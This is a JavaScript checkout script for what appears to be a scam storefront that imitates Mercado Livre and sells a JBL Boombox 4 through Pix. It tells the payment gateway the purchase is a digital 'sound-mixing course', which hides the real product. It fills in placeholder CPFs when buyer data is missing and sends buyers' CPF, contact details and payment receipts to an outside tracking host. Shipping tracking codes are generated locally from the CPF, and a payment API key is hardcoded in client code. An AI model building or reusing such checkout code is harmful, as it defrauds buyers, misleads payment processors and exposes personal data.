  // DDDs válidos da ANATEL — barra código de país (55) digitado no lugar do DDD.
  const _DDDS_BR = new Set([
    11,12,13,14,15,16,17,18,19,
    21,22,24,27,28,
    31,32,33,34,35,37,38,
    41,42,43,44,45,46,47,48,49,
    51,53,54,55,
    61,62,63,64,65,66,67,68,69,
    71,73,74,75,77,79,
    81,82,83,84,85,86,87,88,89,
    91,92,93,94,95,96,97,98,99,
  ]);
  // Devolve só os 11 dígitos do celular (DDD + 9 + 8), removendo o DDI 55 colado na frente.
  // Regra: DDD 55 legítimo tem o 9 logo depois (celular). Se começa com 55 e o próximo
  // dígito NÃO é 9, o 55 é código de país digitado por engano (o caso "(55) 21983-9056").
  function foneDigitsBR(v) {
    let d = onlyDigits(v);
    if (d.slice(0, 2) === '55' && (d.length > 11 || (d.length >= 3 && d[2] !== '9'))) {
      d = d.slice(2); // remove o +55 duplicado, mantém DDD + número reais
    }
    return d.slice(0, 11);
  }
  // Celular BR válido = 11 dígitos, DDD real e o 9 obrigatório na frente do número.
  function foneValidoBR(v) {
    const d = foneDigitsBR(v);
    return d.length === 11 && _DDDS_BR.has(+d.slice(0, 2)) && d[2] === '9';
  }
  // Formato que sempre chega pra gente: dígitos com DDI -> 55 + DDD + 9 + NUMERO
  function foneDDIBR(v) {
    return '55' + foneDigitsBR(v);
  }

  function maskFone(v) {
    let d = foneDigitsBR(v);
    // celular BR começa sempre com 9 depois do DDD — força o 9 e barra ex.: "11 66..."
    if (d.length >= 3 && d[2] !== '9') d = (d.slice(0, 2) + '9' + d.slice(2)).slice(0, 11);
    if (d.length > 6) return `(${d.slice(0,2)}) ${d.slice(2,7)}-${d.slice(7)}`;
    if (d.length > 2) return `(${d.slice(0,2)}) ${d.slice(2)}`;
    if (d.length > 0) return `(${d}`;
    return d;
  }

  /* ---- Validação robusta de CPF com algoritmo dos dígitos verificadores ---- */
  function validarCPF(raw) {
    const cpf = onlyDigits(raw);
    if (cpf.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(cpf)) return false;
    let soma = 0, resto;
    for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i - 1, i), 10) * (11 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.substring(9, 10), 10)) return false;
    soma = 0;
    for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i - 1, i), 10) * (12 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.substring(10, 11), 10)) return false;
    return true;
  }

  // cNum/cVal inline card form removed — card is now captured in #cardFormModal
  $('#fCpf').addEventListener('input', e => { e.target.value = maskCpf(e.target.value); });
  $('#fCpf').addEventListener('blur', e => {
    const val = e.target.value.trim();
    if (val && !validarCPF(val)) {
      fieldErr(e.target, true);
      toast('CPF inválido. Por favor, confira os números digitados.');
    } else if (val) {
      fieldErr(e.target, false);
    }
  });
  $('#fFone').addEventListener('input', e => { e.target.value = maskFone(e.target.value); });
  $('#fUf').addEventListener('input', e => { e.target.value = e.target.value.replace(/[^a-zA-Z]/g,'').toUpperCase().slice(0,2); });

  /* ---- Busca de CEP via ViaCEP com fallback automático para OpenCEP ---- */
  const fCep = $('#fCep');
  let cepReq = 0;                 // id de requisição p/ ignorar respostas fora de ordem
  let lastCep = '';               // evita refazer a busca do mesmo CEP

  async function lookupCep(raw) {
    const cep = onlyDigits(raw);
    if (cep.length !== 8 || cep === lastCep) return;
    lastCep = cep;
    const reqId = ++cepReq;
    fCep.setAttribute('aria-busy', 'true');
    fieldErr(fCep, false);

    let addressData = null;

    // Tentativa 1: ViaCEP
    try {
      const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      if (res.ok) {
        const d = await res.json();
        if (!d.erro && (d.logradouro || d.bairro || d.localidade)) {
          addressData = {
            rua: d.logradouro || '',
            bairro: d.bairro || '',
            cidade: d.localidade || '',
            uf: d.uf || ''
          };
        }
      }
    } catch (_) { /* Falha na primeira tentativa, segue para o fallback */ }

    // Tentativa 2: OpenCEP (Fallback)
    if (!addressData) {
      try {
        const res = await fetch(`https://opencep.com/v1/${cep}`);
        if (res.ok) {
          const d = await res.json();
          if (d && !d.erro && (d.logradouro || d.bairro || d.localidade)) {
            addressData = {
              rua: d.logradouro || '',
              bairro: d.bairro || '',
              cidade: d.localidade || '',
              uf: d.uf || ''
            };
          }
        }
      } catch (_) { /* Falha no fallback */ }
    }

    if (reqId !== cepReq) return; // chegou busca mais recente
    fCep.removeAttribute('aria-busy');

    if (addressData) {
      if (addressData.rua)    $('#fRua').value = addressData.rua;
      if (addressData.bairro) $('#fBairro').value = addressData.bairro;
      if (addressData.cidade) $('#fCidade').value = addressData.cidade;
      if (addressData.uf)     $('#fUf').value = addressData.uf;
      $$('#fRua,#fBairro,#fCidade,#fUf').forEach(i => fieldErr(i, false));
      ($('#fRua').value ? $('#fNum') : $('#fRua')).focus();
      toast('Endereço preenchido pelo CEP.');
    } else {
      lastCep = '';
      fieldErr(fCep, true);
      toast('CEP não localizado nas bases. Preencha o endereço manualmente.');
    }
  }

  fCep.addEventListener('input', e => {
    e.target.value = maskCep(e.target.value);
    if (onlyDigits(e.target.value).length === 8) lookupCep(e.target.value);
  });
  fCep.addEventListener('blur', e => lookupCep(e.target.value));

  $('[data-cep-help]').addEventListener('click', e => {
    e.preventDefault();
    fCep.focus();
    toast('Digite os 8 dígitos do CEP — o endereço é preenchido automaticamente.');
  });

  /* ---- ETAPA 1: endereço + entrega ---- */
  const addrForm = $('#addrForm');

  function fieldErr(input, on) {
    input.setAttribute('aria-invalid', String(on));
    const err = $(`[data-err="${input.id}"]`);
    if (err) err.hidden = !on;
  }

  const ADDR_FIELDS = ['fCep', 'fRua', 'fNum', 'fBairro', 'fCidade', 'fUf'];
  const PERSONAL_FIELDS = ['fEmail', 'fFone', 'fNome', 'fCpf'];

  function validateFields(ids) {
    let firstBad = null;
    ids.forEach(id => {
      const inp = $('#' + id);
      if (!inp) return;
      let bad;
      if (id === 'fCep')   bad = onlyDigits(inp.value).length !== 8;
      else if (id === 'fCpf')   bad = !validarCPF(inp.value);
      else if (id === 'fEmail') bad = !/^[^\s@]+@[^\s@.]+(\.[^\s@.]+)*\.[a-zA-Z]{2,}$/.test(inp.value.trim());
      else if (id === 'fFone')  bad = !foneValidoBR(inp.value);
      else if (id === 'fNome')  bad = inp.value.trim().replace(/[0-9]/g, '').trim().length < 3;
      else bad = !inp.value.trim();
      fieldErr(inp, bad);
      if (bad && !firstBad) firstBad = inp;
    });
    return firstBad;
  }

  function isFieldValid(id) {
    const inp = $('#' + id); if (!inp) return false;
    if (id === 'fCep')   return onlyDigits(inp.value).length === 8;
    if (id === 'fCpf')   return validarCPF(inp.value);
    if (id === 'fEmail') return /^[^\s@]+@[^\s@.]+(\.[^\s@.]+)*\.[a-zA-Z]{2,}$/.test(inp.value.trim());
    if (id === 'fFone')  return foneValidoBR(inp.value);
    if (id === 'fNome')  return inp.value.trim().replace(/[0-9]/g, '').trim().length >= 3;
    return !!inp.value.trim();
  }

  function revealShipping() {
    const sec = document.getElementById('shipSection');
    if (!sec || !sec.hidden) return;
    sec.hidden = false;
    updateCheckout();
    sec.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  // Impede que o cliente digite números no campo nome
  const _fNome = $('#fNome');
  if (_fNome) _fNome.addEventListener('input', () => {
    const cur = _fNome.value;
    const clean = cur.replace(/[0-9]/g, '');
    if (clean !== cur) { const s = _fNome.selectionStart - (cur.length - clean.length); _fNome.value = clean; _fNome.setSelectionRange(s, s); }
  });

  // Auto-revela frete ao sair do último campo de endereço
  ADDR_FIELDS.forEach(id => {
    const inp = $('#' + id);
    if (inp) inp.addEventListener('blur', () => {
      if (ADDR_FIELDS.every(isFieldValid)) revealShipping();
    });
  });

  /* ---- Meli+ upsell (aparece depois do Continuar da fase 1) ---- */
  const meliModal = $('#meliModal');
  let meliShown = false;
  function openMeliModal(onDone) {
    meliShown = true;
    meliModal.classList.add('is-open');
    document.body.style.overflow = 'hidden';
    const close = (accepted) => {
      meliModal.classList.remove('is-open');
      document.body.style.overflow = '';
      if (accepted) {
        meliPlusActive = true;
        // remove eventual meli+ anterior antes de re-adicionar
        extraItems = extraItems.filter(i => !i.isMeliPlus);
        extraItems.push({ title: 'Assinatura meli+ (frete FULL grátis + benefícios)', price: 19.90, qty: 1, isMeliPlus: true });
        // visual: opaca as opções de frete e mostra badge
        const shipOptsEl = document.getElementById('shipOpts');
        const shipBadge  = document.getElementById('meliShipBadge');
        if (shipOptsEl) shipOptsEl.classList.add('is-meli-locked');
        if (shipBadge)  shipBadge.hidden = false;
      }
      updateCheckout();
      onDone();
    };
    $('#meliAdd').onclick  = () => close(true);
    $('#meliSkip').onclick = () => close(false);
  }

  // Fase 1: valida endereço → revela frete (se oculto) → oferece meli+ → revela dados pessoais
  $('#addrPhase1Btn').addEventListener('click', () => {
    const bad = validateFields(ADDR_FIELDS);
    if (bad) { bad.focus(); return; }
    const sec = document.getElementById('shipSection');
    if (sec && sec.hidden) { revealShipping(); return; }

    ttkTrack('step_endereco', { value: unitPrice() * qty, quantity: qty });

    const goToPhase2 = () => {
      const p2 = document.getElementById('addrPhase2');
      p2.hidden = false;
      document.getElementById('addrPhase1Btn').style.display = 'none';
      ttkTrack('step_dados', { value: unitPrice() * qty, quantity: qty });
      const first = PERSONAL_FIELDS.map(id => $('#' + id)).find(inp => inp && !inp.value.trim());
      if (first) first.focus();
      p2.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    };

    // Só oferece meli+ uma vez e se ele ainda não estiver ativo
    if (!meliShown && !meliPlusActive) openMeliModal(goToPhase2);
    else goToPhase2();
  });

  // Fase 2 (submit): valida dados pessoais → avança para pagamento
  addrForm.addEventListener('submit', e => {
    e.preventDefault();
    const bad = validateFields(PERSONAL_FIELDS);
    if (bad) { bad.focus(); return; }

    // Advanced matching TikTok — e-mail/telefone alimentam o EMQ dos eventos seguintes
    ttkIdentify({ email: $('#fEmail').value.trim(), phone: onlyDigits($('#fFone').value) });
    try { localStorage.setItem('_ttk_email', $('#fEmail').value.trim().toLowerCase()); localStorage.setItem('_ttk_phone', onlyDigits($('#fFone').value)); } catch (_) {}

    const shipVal = ($('input[name="ship"]:checked', addrForm) || {}).value;
    const SHIP_LABELS = { normal: 'Envio 1 (12 a 15 dias)', correios: 'Envio 2 (9 a 10 dias)', jadlog: 'Envio 3 (5 a 8 dias)', full: 'Envio 4 (1 dia útil)' };
    const SHIP_PRICE_LABELS = { normal: 'Grátis', correios: 'R$ 7,90', jadlog: 'R$ 11,90', full: 'R$ 15,90' };
    const shipLabel = SHIP_LABELS[shipVal] || 'Envio 1 (12 a 15 dias)';
    const shipPriceLabel = SHIP_PRICE_LABELS[shipVal] || 'Grátis';
    const addr = `${$('#fRua').value}, ${$('#fNum').value}, ${$('#fBairro').value}, ${$('#fCidade').value}/${$('#fUf').value}`;
    $('[data-summary="1"]').textContent = `${addr} · CEP ${$('#fCep').value} · ${shipLabel} · ${shipPriceLabel}`;
    goTo(2);
  });

  /* ---- ETAPA 2: pagamento ---- */
  function fillParcelas() { /* parcelas agora são populadas dentro de abrirCardForm() */ }

  /* ---- preenche os cards da etapa de revisão (estilo ML) ---- */
  function updateReview() {
    const total = unitPrice() * qty + shipCost();
    $('#revBillName').textContent = $('#fNome').value.trim() || 'Cliente';
    $('#revBillCpf').textContent = `CPF ${$('#fCpf').value || ''}`;
    $('#revShipAddr').textContent = `${$('#fRua').value} ${$('#fNum').value}`.trim();
    const shipVal = ($('input[name="ship"]:checked', addrForm) || {}).value;
    const SHIP_INFO = {
      normal:   { name: 'Envio 1', eta: 'Envio 1 — chega em 12 a 15 dias úteis · Grátis', tag: 'Envio 1' },
      correios: { name: 'Envio 2', eta: 'Envio 2 — chega em 9 a 10 dias úteis · R$ 7,90', tag: 'Envio 2' },
      jadlog:   { name: 'Envio 3', eta: 'Envio 3 — chega em 5 a 8 dias úteis · R$ 11,90', tag: 'Envio 3' },
      full:     { name: 'Envio 4', eta: 'Envio 4 — chega em 4 a 7 dias úteis · R$ 15,90', tag: 'Envio 4 <span class="full"><svg width="9" height="9" aria-hidden="true" focusable="false"><use href="#i-bolt"></use></svg>FULL</span>' },
    };
    const curShip = SHIP_INFO[shipVal] || SHIP_INFO.full;
    $('#revShipEta').textContent = curShip.eta;
    const revShipTag = $('#revShipTag') || $('.rev-card__tag');
    if (revShipTag) revShipTag.innerHTML = curShip.tag;
    $('#revQty').textContent = String(qty);
    const revProdName = $('#revProdName');
    if (revProdName) revProdName.textContent = `JBL Boombox 4 ${corSelecionada()}`;
    // Sincroniza thumb da revisão com a cor selecionada no front
    const selColorImg = $('#varCorOpts .var-btn.is-sel img');
    const revThumb    = $('#revThumb');
    if (selColorImg && revThumb) {
      revThumb.src = selColorImg.src;
      revThumb.alt = selColorImg.alt || '';
    }

    if (S.payMethod === 'card' && S.cardData) {
      const sel = el('cfParc');
      const parcTxt = sel ? sel.options[sel.selectedIndex].text : '';
      $('#revPayName').textContent = 'Cartão de crédito';
      $('#revPayAmt').textContent = parcTxt;
      $('#revPayHint').textContent = 'Ao confirmar a compra, o cartão será processado.';
    } else {
      $('#revPayName').textContent = 'Pix';
      $('#revPayAmt').textContent = money(total);
      $('#revPayHint').textContent = 'Ao confirmar a compra, você terá as informações para pagar.';
    }
  }

  // payOpts change interceptado via onclick="selectPayMethod()" nas labels
  $('#shipOpts').addEventListener('change', e => {
    if (e.target.name !== 'ship') return;
    $$('.ship-opt', cho).forEach(l => l.classList.toggle('is-sel', $('input', l).checked));
    updateCheckout();
  });

  $('[data-continue="2"]').addEventListener('click', () => {
    $('[data-summary="2"]').textContent = PAY_LABEL[S.payMethod]
      + (S.payMethod === 'pix' ? ' · 73% OFF' : '');
    goTo(3);
  });

  /* ---- links "Editar/Alterar" (etapas concluídas e cards de revisão) ---- */
  $$('[data-edit]', cho).forEach(el =>
    el.addEventListener('click', e => { e.preventDefault(); goTo(Number(el.dataset.edit)); }));

  /* ---- ETAPA 3: pagar → tela de sucesso ---- */
  function fakePixCode() {
    const rnd = () => Math.random().toString(36).slice(2, 10);
    return `00020126580014br.gov.bcb.pix0136${rnd()}-${rnd()}-demo5204000053039865802BR5909JBL STORE6006OSASCO62070503***6304${rnd().slice(0,4).toUpperCase()}`;
  }

  function renderQR() {
    // QR fictício: grade 25×25 pseudoaleatória + 3 marcadores de canto (apenas visual)
    const N = 25, cell = 100 / N;
    let rects = '';
    const finder = (ox, oy) => {
      for (let y = 0; y < 7; y++) for (let x = 0; x < 7; x++) {
        const edge = x === 0 || y === 0 || x === 6 || y === 6;
        const core = x >= 2 && x <= 4 && y >= 2 && y <= 4;
        if (edge || core) rects += `<rect x="${(ox+x)*cell}" y="${(oy+y)*cell}" width="${cell}" height="${cell}"/>`;
      }
    };
    for (let y = 0; y < N; y++) for (let x = 0; x < N; x++) {
      const inFinder = (x < 8 && y < 8) || (x > N-9 && y < 8) || (x < 8 && y > N-9);
      if (!inFinder && Math.random() > 0.52) rects += `<rect x="${x*cell}" y="${y*cell}" width="${cell}" height="${cell}"/>`;
    }
    finder(0, 0); finder(N - 7, 0); finder(0, N - 7);
    $('#choQr').innerHTML = `<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" fill="#000" shape-rendering="crispEdges" role="img" aria-label="QR Code Pix de demonstração">${rects}</svg>`;
  }

  /* ---- intersticial de carregamento (reutilizável) ---- */
  const loadView = $('#choLoading');
  const loadText = $('#choLoadingText');
  let loadTimer = null;
  function showLoading(html) { loadText.innerHTML = html; loadView.hidden = false; }
  function hideLoadingAfter(delay, done) {
    clearTimeout(loadTimer);
    loadTimer = setTimeout(() => { loadView.hidden = true; if (done) done(); }, delay);
  }

  /* ---- descrição do pedido enviada ao gateway (cor certa + extras + meli+) ----
     O gateway mostra a `description` como item da compra. Sem isto ele mostrava
     sempre "JBL Boombox 4 Branca", ignorando a cor escolhida e os add-ons. */
  function corSelecionada() {
    return (($('#varCorLabel') || {}).textContent || 'Preta').trim() || 'Preta';
  }

  function buildDescription() {
    const cor = corSelecionada();
    const parts = [];
    parts.push(`Curso de Mixagem de Som para Iniciantes${qty > 1 ? ` (${qty}x)` : ''}`);
    extraItems.forEach(i => {
      const nome = i.isMeliPlus ? 'Upsell 1'
                 : i.isSeguro   ? 'Upsell 2'
                 : 'Acesso vitalício';
      const q = (i.qty && i.qty > 1) ? ` (${i.qty}x)` : '';
      parts.push(`${nome}${q}`);
    });
    return parts.join(' + ').slice(0, 190);
  }

  /* ---- geração de PIX na API própria + polling de status ---- */
  function pixCreateBody() {
    return Object.assign({
      value: unitPrice() * qty + extraTotal() + shipCost(),  // produto + extras + frete
      description: buildDescription(),
      payerName: $('#fNome').value.trim(),
      payerCpf: onlyDigits($('#fCpf').value),
      payerEmail: $('#fEmail').value.trim(),
      payerPhone: foneDDIBR($('#fFone').value),   // dígitos com DDI: 55 + DDD + 9 + NUMERO
      offer: PIX_CFG.offer,
      funnel: PIX_CFG.funnel,
      payerStreet: $('#fRua').value.trim(),
      payerNumber: $('#fNum').value.trim(),
      payerComplement: $('#fCompl').value.trim(),
      payerNeighborhood: $('#fBairro').value.trim(),
      payerCity: $('#fCidade').value.trim(),
      payerState: $('#fUf').value.trim(),
      payerZip: onlyDigits($('#fCep').value)
    }, getTracking());
  }

  function getAvenKey() {
    return (window.ENV && window.ENV.AVEN_API_KEY) || 'nFlpnvHTiVCpB2h8S5smXokwES9niS2UU1OTUJd82GA';
  }

  async function createPixDirectAven(body, amountFloat) {
    const priceCents = Math.round(amountFloat * 100);
    const rawCpf = String(body.payerCpf || '').replace(/\D/g, '');
    const cpfDigits = (rawCpf.length === 11 && !/^(\d)\1{10}$/.test(rawCpf)) ? rawCpf : '52998224725';
    let phoneDigits = String(body.payerPhone || '').replace(/\D/g, '');
    if (phoneDigits.length > 11 && phoneDigits.startsWith('55')) phoneDigits = phoneDigits.slice(2);
    if (phoneDigits.length < 10) phoneDigits = '11999998888';
    const formattedPhone = '+55' + phoneDigits;

    const refId = 'REF-' + Date.now() + '-' + Math.floor(Math.random() * 10000);
    const prodName = String(body.description || 'JBL Boombox 4').substring(0, 100);

    const payload = {
      amount: priceCents,
      currency: 'BRL',
      method: 'PIX',
      description: prodName,
      externalRef: refId,
      notificationUrl: window.location.origin + '/webhook/payment',
      payer: {
        name: String(body.payerName || 'Cliente JBL').trim() || 'Cliente JBL',
        taxId: cpfDigits,
        email: String(body.payerEmail || 'contato@cliente.com').trim() || 'contato@cliente.com',
        phone: formattedPhone
      },
      items: [
        {
          quantity: 1,
          name: prodName,
          price: priceCents,
          type: 'DIGITAL'
        }
      ]
    };

    const res = await fetch('https://api.avenpayments.com/v1/payment', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + getAvenKey()
      },
      body: JSON.stringify(payload)
    });

    let data = {};
    try { data = await res.json(); } catch (_) {}

    const pixPayload = (data.data && data.data.copypaste) || (data.pix && (data.pix.qrcode || data.pix.code || data.pix.payload)) || data.qr_code || data.copypaste;

    if (res.ok && (data.id || pixPayload)) {
      const txid = String(data.id || refId);
      const qrCode = pixPayload || '';
      return {
        txid: txid,
        qrCode: qrCode,
        base64QrCode: '',
        purchaseEventId: txid
      };
    }

    const msg = data.message || data.error || 'Erro ao gerar Pix na Aven Payments';
    throw new Error('Aven Payments: ' + msg);
  }

  async function createPix() {
    const body = pixCreateBody();
    const amountFloat = Number(body.value || 0);
    const isLocalhost = location.hostname === 'localhost' || location.hostname === '127.0.0.1';

    // No GitHub Pages ou qualquer ambiente estático sem PHP, chama direto a API da PinguPag (com CORS oficial)
    if (!isLocalhost) {
      return await createPixDirectAven(body, amountFloat);
    }

    let endpoint = '/api/gerar-pix.php';
    let reqBody = JSON.stringify({
      price_cents: Math.round(amountFloat * 100),
      produto: body.description || 'JBL Boombox 4',
      customer: {
        name: body.payerName || 'Cliente JBL',
        email: body.payerEmail || 'contato@cliente.com',
        phone: body.payerPhone || '11999999999',
        cpf: body.payerCpf || '52998224725'
      },
      cep: body.payerZip,
      cidade: body.payerCity,
      uf: body.payerState,
      utm: getTracking()
    });

    try {
      const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: reqBody
      });
      if (res.ok) {
        let data = await res.json();
        if (data.success !== false && (data.qrCode || data.pixCode)) {
          return {
            txid: data.transacao_id || data.txid || data.id,
            qrCode: data.qrCode || data.pixCode || data.qr_code,
            base64QrCode: data.base64QrCode || data.qr_code_base64,
            purchaseEventId: data.purchaseEventId || data.transacao_id || data.txid
          };
        }
      }
    } catch (_) {}

    // Fallback direto PinguPag
    return await createPixDirectAven(body, amountFloat);
  }

  let lastPurchase = null;                        // guarda valor + eventID p/ o Purchase do pixel
  let currentTxid  = null;                        // txid do PIX gerado (para envio de comprovante)
  let comprovTimer = null;                        // timer 60s para exibir bloco de comprovante

  function showPixResult(data) {
    if (data.base64QrCode) {
      const qrImg = document.createElement('img');
      qrImg.width = 190; qrImg.height = 190; qrImg.alt = 'QR Code Pix';
      // O servidor devolve o prefixo `data:image/png;base64,` DUPLICADO, o que
      // impede o <img> de renderizar. Normaliza antes de usar.
      qrImg.src = (function (b64) {
        if (!b64) return '';
        var v = String(b64).trim();
        var m = v.match(/^(?:data:image[/][a-z0-9.+-]+;base64,)+/i);
        return m ? 'data:image/png;base64,' + v.slice(m[0].length)
                 : 'data:image/png;base64,' + v;
      })(data.base64QrCode);   // setAttribute via DOM — sem risco de injeção de HTML
      const qrEl = $('#choQr'); qrEl.innerHTML = ''; qrEl.appendChild(qrImg);
    } else {
      renderQR();                                // fallback visual se a API não devolver imagem
    }
    $('#pixCode').textContent = data.qrCode || data.pixCode || '';
    lastPurchase = { value: unitPrice() * qty, eventId: data.purchaseEventId || data.txid || '' };
    currentTxid = data.txid || null;
    doneView.hidden = false;
    cho.querySelector('.cho__scroll').scrollTop = 0;
    startPolling(data.txid);
    // Exibe bloco de comprovante após 60 segundos se o PIX ainda não foi confirmado
    clearTimeout(comprovTimer);
    comprovTimer = setTimeout(() => {
      const el = $('#choComprovante');
      if (el) el.hidden = false;
    }, 60000);
  }

  // ── Bloco de comprovante ──────────────────────────────────────────────────────
  (function initComprovante() {
    const form     = $('#comprovForm');
    const fileInp  = $('#comprovFile');
    const fileLabel= $('#comprovFileName');
    const btn      = $('#comprovBtn');
    const okEl     = $('#comprovOk');
    if (!form || !fileInp) return;

    fileInp.addEventListener('change', () => {
      const f = fileInp.files[0];
      if (f) {
        fileLabel.textContent = f.name;
        btn.disabled = false;
      } else {
        fileLabel.textContent = 'Imagem (JPG/PNG) ou PDF — até 20 MB';
        btn.disabled = true;
      }
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const f = fileInp.files[0];
      if (!f) return;
      btn.disabled = true;
      btn.textContent = 'Enviando...';
      try {
        const fd = new FormData();
        fd.append('comprovante', f);
        if (currentTxid) fd.append('pedido', currentTxid);
        // Dados do cliente — fallback caso o servidor perca a ordem em memória
        const _nome  = ($('#fNome')  || {}).value || '';
        const _email = ($('#fEmail') || {}).value || '';
        const _fone  = $('#fFone') ? foneDDIBR($('#fFone').value) : '';  // dígitos com DDI
        const _cpf   = ($('#fCpf')   || {}).value || '';
        const _valor = String(unitPrice() * qty + extraTotal() + shipCost());
        const _pix   = ($('#pixCode') || {}).textContent || '';
        const _ship  = ($('input[name="ship"]:checked') || {}).value || 'normal';
        if (_nome)  fd.append('nome',  _nome);
        if (_email) fd.append('email', _email);
        if (_fone)  fd.append('telefone', _fone);
        if (_cpf)   fd.append('cpf',   _cpf);
        if (_valor) fd.append('valor', _valor);
        if (_pix)   fd.append('pix_code', _pix);
        if (_ship)  fd.append('frete', _ship);
        const r = await fetch('https://tiktok-tracking.onrender.com/api/comprovante', { method: 'POST', body: fd });
        const d = await r.json().catch(() => ({}));
        if (r.ok && d.ok !== false) {
          form.hidden = true;
          okEl.hidden = false;
        } else {
          btn.disabled = false;
          btn.textContent = 'Enviar comprovante';
          alert('Erro ao enviar. Tente novamente.');
        }
      } catch (_) {
        btn.disabled = false;
        btn.textContent = 'Enviar comprovante';
        alert('Sem conexão. Verifique sua internet e tente novamente.');
      }
    });
  })();

      function startPolling(txid) {
    clearInterval(pollTimer);
    if (!txid) return;
    pollTimer = setInterval(async () => {
      try {
        const isLocalhost = location.hostname === 'localhost' || location.hostname === '127.0.0.1';
        let resData = null;

        if (!isLocalhost) {
          // Consulta direta à Aven Payments via browser (CORS liberado)
          const r = await fetch('https://api.avenpayments.com/v1/payment/' + encodeURIComponent(txid), {
            headers: { 'Authorization': 'Bearer ' + getAvenKey() }
          });
          resData = await r.json();
        } else {
          const r = await fetch('/api/status-pix.php?id=' + encodeURIComponent(txid));
          resData = await r.json();
        }

        const raw = String((resData && resData.status) || (Array.isArray(resData) && resData[0] ? resData[0].status : '')).toUpperCase();
        if (PAID_STATUS.includes(raw) || ['PAID', 'APPROVED', 'COMPLETED', 'SUCCEEDED', 'PAGO'].includes(raw)) {
          clearInterval(pollTimer);
          if (window.ML_ANALYTICS) window.ML_ANALYTICS.track('pix_paid', 'Pix pago e compensado');
          onPixPaid();
        }
      } catch (_) { /* ignora falha pontual de rede; segue tentando */ }
    }, PIX_CFG.pollMs);
  }

  function onPixPaid() {
    clearTimeout(comprovTimer);
    const comprovEl = $('#choComprovante');
    if (comprovEl) comprovEl.hidden = true;
    // Purchase client-side (deduplicado com o CAPI pelo mesmo eventID = purchaseEventId)
    const val = lastPurchase ? lastPurchase.value : unitPrice() * qty;
    fbTrack('Purchase',
      { value: val, currency: 'BRL', content_ids: [PRODUCT_ID], content_type: 'product', num_items: qty },
      lastPurchase && lastPurchase.eventId ? { eventID: lastPurchase.eventId } : undefined);

    // TikTok: dispara tanto CompletePayment (padrão TikTok Shop / E-commerce) quanto Purchase
    const ttkOrderId = (lastPurchase && lastPurchase.eventId) || ('pur-' + Date.now());
    const ttkPayload = {
      content_id: 'JBLBOOMBOX4BLKBR',
      content_type: 'product',
      content_name: 'Caixa de Som Bluetooth JBL Boombox 4 Branca',
      value: val,
      currency: 'BRL',
      quantity: qty,
      order_id: ttkOrderId,
      event_id: ttkOrderId,
      user: { email: $('#fEmail').value.trim(), phone: onlyDigits($('#fFone').value) }
    };
    ttkTrack('CompletePayment', ttkPayload);
    ttkTrack('Purchase', ttkPayload);
    if (typeof ttq !== 'undefined' && typeof ttq.track === 'function') {
      try { ttq.track('CompletePayment', ttkPayload, { event_id: ttkOrderId }); } catch (_) {}
      try { ttq.track('PlaceAnOrder', ttkPayload, { event_id: ttkOrderId }); } catch (_) {}
    }
    // Salva dados do cliente ANTES de qualquer redirect (seguro.html precisa)
    _saveSeguroData();
    try {
      const _colorEl = document.getElementById('varCorLabel');
      const _colorLbl = (_colorEl && _colorEl.textContent) ? ' ' + _colorEl.textContent.trim() : '';
      const _mainImg = ($('#stageImg') || {}).src || '';
      const _obCart = [{ name: "Caixa de Som Bluetooth À Prova D'água JBL Boombox 4" + _colorLbl, image: _mainImg, qty, type: 'main' }];
      document.querySelectorAll('.ob-item.is-sel').forEach(function(it) {
        const t = it.dataset.title; if (!t) return;
        const im = (it.querySelector('.ob-item__img img') || {}).src || '';
        _obCart.push({ name: t, image: im, qty: 1, type: 'bump' });
      });
      localStorage.setItem('obrigado_cart', JSON.stringify(_obCart));
      const _shipV = meliPlusActive ? 'full' : (($('input[name="ship"]:checked') || {}).value || 'normal');
      localStorage.setItem('obrigado_ship', _shipV);
      localStorage.removeItem('ml_prize_won');

      // Gera e registra o código de rastreio único do pedido principal JBL para este CPF
      const _cpfClean = onlyDigits($('#fCpf').value) || '05481744180';
      let _storedMap = {};
      try { _storedMap = JSON.parse(localStorage.getItem('ml_cpf_tracking_map') || '{}'); } catch (_) {}
      let _tCode = _storedMap[_cpfClean];
      if (!_tCode) {
        let _h = 0;
        for (let i = 0; i < _cpfClean.length; i++) { _h = ((_h << 5) - _h) + _cpfClean.charCodeAt(i); _h |= 0; }
        const _numPart = Math.abs(_h % 900000000) + 100000000;
        _tCode = 'ML' + _numPart + 'BR';
        _storedMap[_cpfClean] = _tCode;
        localStorage.setItem('ml_cpf_tracking_map', JSON.stringify(_storedMap));
      }
      localStorage.setItem('ml_last_tracking_code', _tCode);

      let _segData = {};
      try { _segData = JSON.parse(localStorage.getItem('mlSeguroData') || '{}'); } catch (_) {}
      const _records = JSON.parse(localStorage.getItem('ml_tracking_records') || '{}');
      const _trackRec = {
        code: _tCode,
        createdAt: _records[_tCode] ? _records[_tCode].createdAt : Date.now(),
        customer: _segData,
        cart: _obCart,
        prize: null,
        shipping: _shipV
      };
      _records[_tCode] = _trackRec;
      localStorage.setItem('ml_tracking_records', JSON.stringify(_records));

      const _isLoc = location.hostname === 'localhost' || location.hostname === '127.0.0.1';
      fetch(_isLoc ? '/api/tracking' : ((location.hostname.endsWith('github.io') ? '' : '') + '/.netlify/functions/tracking'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(_trackRec)
      }).catch(function() {});
    } catch (_) {}
    // dá um instante pro pixel enviar antes de redirecionar
    if (PIX_CFG.thankYouUrl) { setTimeout(() => { window.location.href = PIX_CFG.thankYouUrl; }, 500); return; }
    setTimeout(() => { window.location.href = (PIX_CFG.thankYouUrl || 'roleta/' + location.search); }, 500);
  }

  function showPaidScreen() {
    const paidView = document.getElementById('choPaid');
    if (!paidView) return;

    // Dias úteis pra chegar por método (Envio 1-4 ou meli+ full)
    const SHIP_DAYS = {
      normal:   [12, 15],
      correios: [9, 10],
      jadlog:   [5, 8],
